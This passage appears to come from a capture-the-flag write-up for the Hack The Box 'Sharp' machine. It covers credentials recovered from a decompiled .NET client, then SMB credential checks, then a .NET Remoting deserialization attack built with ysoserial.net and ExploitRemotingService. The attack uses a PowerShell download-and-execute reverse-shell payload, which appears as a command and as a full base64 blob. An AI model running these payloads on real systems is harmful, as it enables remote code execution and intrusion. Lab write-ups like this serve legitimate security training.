+RegisterChannel
+set_Item
+System
+Main
+System.Reflection
+System.Runtime.Remoting.Channels.Tcp
+Activator
+.ctor
+System.Diagnostics
+ChannelServices
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+DebuggingModes
+GetChannelSinkProperties
+args
+System.Runtime.Remoting.Channels
+System.Collections
+GetObject
+Client
+IDictionary
+RemotingLibrary
+tVnq
+WrapNonExceptionThrows
+Client
+Copyright 
+  2015
+$e2d87af4-09e3-406f-ae67-7dcc19daf576
+1.0.0.0
+.NETFramework,Version=v4.5
+FrameworkDisplayName
+.NET Framework 4.5
+RSDS
+C:\Users\cube0x0\Desktop\Sharp\net-remoting\RemotingLibrary\Client\obj\Release\Client.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+=====================================================================================================================================
+
+We find a new user "cube0x0" we attempt the password spray but get nothing back, next is to analyze the client file on windows.
+We again use dnspy to decompile and analyze the binary file for server, client, and the remoting dll.
+
+
+In the client file it seems that we find creds in the main of the program application.
+Commands and Output:
+=====================================================================================================================================
+// RemotingSample.Client
+// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+private static void Main(string[] args)
+{
+	ChannelServices.RegisterChannel(new TcpChannel(), true);
+	IDictionary channelSinkProperties = ChannelServices.GetChannelSinkProperties((Remoting)Activator.GetObject(typeof(Remoting), "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"));
+	channelSinkProperties["username"] = "debug";
+	channelSinkProperties["password"] = "SharpApplicationDebugUserPassword123!";
+}
+=====================================================================================================================================
+
+We try crackmap exec again using those creds and we get a hit.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $crackmapexec smb 10.10.10.219 -u debug -p 'SharpApplicationDebugUserPassword123!' 
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\debug:SharpApplicationDebugUserPassword123!
+=====================================================================================================================================
+
+We are able to list shares but no more access to any other shares.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $crackmapexec smb 10.10.10.219 -u debug -p 'SharpApplicationDebugUserPassword123!' --shares
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\debug:SharpApplicationDebugUserPassword123! 
+SMB         10.10.10.219    445    SHARP            [+] Enumerated shares
+SMB         10.10.10.219    445    SHARP            Share           Permissions     Remark
+SMB         10.10.10.219    445    SHARP            -----           -----------     ------
+SMB         10.10.10.219    445    SHARP            ADMIN$                          Remote Admin
+SMB         10.10.10.219    445    SHARP            C$                              Default share
+SMB         10.10.10.219    445    SHARP            dev                             
+SMB         10.10.10.219    445    SHARP            IPC$            READ            Remote IPC
+SMB         10.10.10.219    445    SHARP            kanban
+=====================================================================================================================================
+
+
+Things to point out about the code found. It's that it is doing deserialization between the client and server.
+On our windows box we google, .net remoting exploit and we find a github that does this kinds fo attacks we download on our windows vm
+https://github.com/tyranid/ExploitRemotingService
+https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/
+
+Reading both links will give us more insight on how things work for the desrialization attack
+Commands and Output:
+=====================================================================================================================================
+private static void StartServer()
+		{
+			Hashtable hashtable = new Hashtable();
+			((IDictionary)hashtable)["port"] = 8888;
+			((IDictionary)hashtable)["rejectRemoteRequests"] = false;
+			BinaryServerFormatterSinkProvider binaryServerFormatterSinkProvider = new BinaryServerFormatterSinkProvider();
+			binaryServerFormatterSinkProvider.TypeFilterLevel = TypeFilterLevel.Full;
+			ChannelServices.RegisterChannel(new TcpChannel(hashtable, new BinaryClientFormatterSinkProvider(), binaryServerFormatterSinkProvider), true);
+			RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;
+			RemotingConfiguration.RegisterWellKnownServiceType(typeof(Remoting), "SecretSharpDebugApplicationEndpoint", WellKnownObjectMode.Singleton);
+			Console.WriteLine("Registered service");
+			for (;;)
+			{
+				Console.ReadLine();
+=====================================================================================================================================
+
+Looking at the server code we see that using a binary server, we will send a serialized payload to the service.
+
+We will open the .sln file from the .net exploit git page using visual studio.
+
+We also need ysoserial.net
+
+Also a hint from all the guessing of using dotnet tools comes from the notes.txt
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $cat notes.txt 
+Todo:
+    Migrate from .Net remoting to WCF
+    Add input validation
+=====================================================================================================================================
+
+Once that is figured out, we look back the exploitremoting service and try to run the binary exe that was created from visual studios
+by building it and we create a cmd from which to run it from.
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando>cd "C:\Users\commando\Desktop\sharp\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Release\"
+
+C:\Users\commando\Desktop\sharp\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ls
+ExploitRemotingService.exe         FakeAsm.dll
+ExploitRemotingService.exe.config  FakeAsm.pdb
+ExploitRemotingService.pdb         NDesk.Options.dll
+
+C:\Users\commando\Desktop\sharp\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe
+Must specify a URI and command
+ExploitRemotingService [options] uri command [command args]
+Copyright (c) James Forshaw 2014
+
+Uri:
+The supported URI are as follows:
+tcp://host:port/ObjName   - TCP connection on host and portname
+ipc://channel/ObjName     - Named pipe channel
+
+Options:
+
+  -s, --secure               Enable secure mode
+  -p, --port=VALUE           Specify the local TCP port to listen on
+  -i, --ipc=VALUE            Specify listening pipe name for IPC channel
+      --user=VALUE           Specify username for secure mode
+      --pass=VALUE           Specify password for secure mode
+      --ver=VALUE            Specify version number for remote, 2 or 4
+      --usecom               Use DCOM backchannel instead of .NET remoting
+      --remname=VALUE        Specify the remote object name to register
+  -v, --verbose              Enable verbose debug output
+      --useser               Uses old serialization tricks, only works on
+                               full type filter services
+      --uselease             Uses new serialization tricks by abusing lease
+                               mechanism.
+      --nulluri              Don't send the URI header to the server
+      --autodir              When useser is specified try and automatically
+                               work out the installdir parameter from the
+                               server's current directory.
+      --installdir=VALUE     Specify the install directory of the service
+                               executable to enable full support with useser
+      --path=VALUE           Specify an output path to write the request data
+                               rather than to a channel.
+  -h, -?, --help
+
+Commands:
+exec [-wait] program [cmdline]: Execute a process on the hosting server
+cmd  cmdline                  : Execute a command line process and display stdout
+put  localfile remotefile     : Upload a file to the hosting server
+get  remotefile localfile     : Download a file from the hosting server
+ls   remotedir                : List a remote directory
+run  file [args]              : Upload and execute an assembly, calls entry point
+user                          : Print the current username
+ver                           : Print the OS version
+raw base64_object|file        : Send a raw serialized object to the service.
+=====================================================================================================================================
+
+We now have to create aserialization payload before running.
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\Desktop\sharp>cd "C:\Users\commando\Desktop\sharp\ysoserial.net-1.34\ysoserial.net-1.34\ysoserial\bin\Release\"
+
+C:\Users\commando\Desktop\sharp\ysoserial.net-1.34\ysoserial.net-1.34\ysoserial\bin\Release>ls
+E.dll                             Newtonsoft.Json.xml
+FSharp.Core.dll                   Polenter.SharpSerializer.dll
+FSharp.Core.xml                   Polenter.SharpSerializer.xml
+FsPickler.CSharp.dll              TestConsoleApp_YSONET.exe
+FsPickler.CSharp.pdb              TestConsoleApp_YSONET.exe.config
+FsPickler.CSharp.xml              TestConsoleApp_YSONET.pdb
+FsPickler.Json.dll                YamlDotNet.dll
+FsPickler.Json.pdb                YamlDotNet.xml
+FsPickler.Json.xml                dlls
+FsPickler.dll                     fastjson.dll
+FsPickler.pdb                     microsoft.identitymodel.dll
+FsPickler.xml                     ysoserial.exe
+Microsoft.PowerShell.Editor.dll   ysoserial.exe.config
+NDesk.Options.dll                 ysoserial.pdb
+Newtonsoft.Json.dll
+
+C:\Users\commando\Desktop\sharp\ysoserial.net-1.34\ysoserial.net-1.34\ysoserial\bin\Release>
+
+=====================================================================================================================================
+
+Following the instructions in:
+https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/
+Binary formatter with atype confuse delegate
+
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\Desktop\sharp\ysoserial.net-1.34\ysoserial.net-1.34\ysoserial\bin\Release>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/rev.ps1')
+
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFgvYyBwb3dlcnNoZWxsIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMTUvcmV2LnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
+=====================================================================================================================================
+
+Once we have the payload we will have to circumvent a windows and linux issue of running the execuatble since the windows machine is
+not connected to the vpn, so what we can do is make our linux machine into a router to get the shell back.
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\Desktop\sharp\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFgvYyBwb3dlcnNoZWxsIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMTUvcmV2LnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
+=====================================================================================================================================
+
+That's the payload now we will create aroute to execute by forwarding our linux traffic the windows vm 
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $sudo su
+[sudo] password for user: 
+┌─[root@parrot-virtual]─[/home/user/htb/sharp/smb/dev]
+└──╼ #echo 1 > /proc/
+Display all 288 possibilities? (y or n)
+┌─[root@parrot-virtual]─[/home/user/htb/sharp/smb/dev]
+└──╼ #echo 1 > /proc/sys/net/ipv4/ip_forward
+
+WINDOWS:
+PS C:\WINDOWS\system32> route add 10.10.10.0 mask 255.255.255.0 192.168.33.7
+ OK!
+PS C:\WINDOWS\system32> route print
+===========================================================================
+Interface List
+  3...08 00 27 d9 e4 b9 ......Intel(R) PRO/1000 MT Desktop Adapter
+  8...02 00 4c 4f 4f 50 ......Npcap Loopback Adapter
+  6...08 00 27 32 b8 c6 ......Intel(R) PRO/1000 MT Desktop Adapter #2
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0         10.0.2.2        10.0.2.15     25
+         10.0.2.0    255.255.255.0         On-link         10.0.2.15    281
+        10.0.2.15  255.255.255.255         On-link         10.0.2.15    281
+       10.0.2.255  255.255.255.255         On-link         10.0.2.15    281
+       10.10.10.0    255.255.255.0     192.168.33.7     192.168.33.4     26
+=====================================================================================================================================
+
+Now inorder to get this to work is to create an iptables rule to forward between 2 interfaces.
+Commands and Output:
+=====================================================================================================================================
+┌─[root@parrot-virtual]─[/home/user/htb/sharp/smb/dev]
+└──╼ #echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Do the forwarding
+iptables -A FORWARD -i tun0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i eth1 -o tun9 -j ACCEPT
+
+#ADD NAT
+sudo iptables -t nat -A POSTROUTING -s 192.168.33.0/24 -o tun0 -j MASQUERADE
+
+#WINDOWS:
+C:\Users\commando\Desktop\sharp\ysoserial.net-1.34\ysoserial.net-1.34\ysoserial\bin\Release>ping.exe 10.10.10.219
+
+Pinging 10.10.10.219 with 32 bytes of data:
+Reply from 10.10.10.219: bytes=32 time=90ms TTL=126
+Reply from 10.10.10.219: bytes=32 time=94ms TTL=126
+Reply from 10.10.10.219: bytes=32 time=86ms TTL=126
+Reply from 10.10.10.219: bytes=32 time=88ms TTL=126
+
+Ping statistics for 10.10.10.219:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 86ms, Maximum = 94ms, Average = 89ms
+=====================================================================================================================================
+
+Now our linux machine is acting as router and we can now run the exploit. 
+We now copy a nishang tcp ps1 reverse shell to our directory and specify the target ip address and port to listen to and setup
+a web server to pull data from.
+
+We run the payload, but we get an error
+Commands and Output:
+=====================================================================================================================================
+C:\Users\commando\Desktop\sharp\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFgvYyBwb3dlcnNoZWxsIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMTUvcmV2LnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN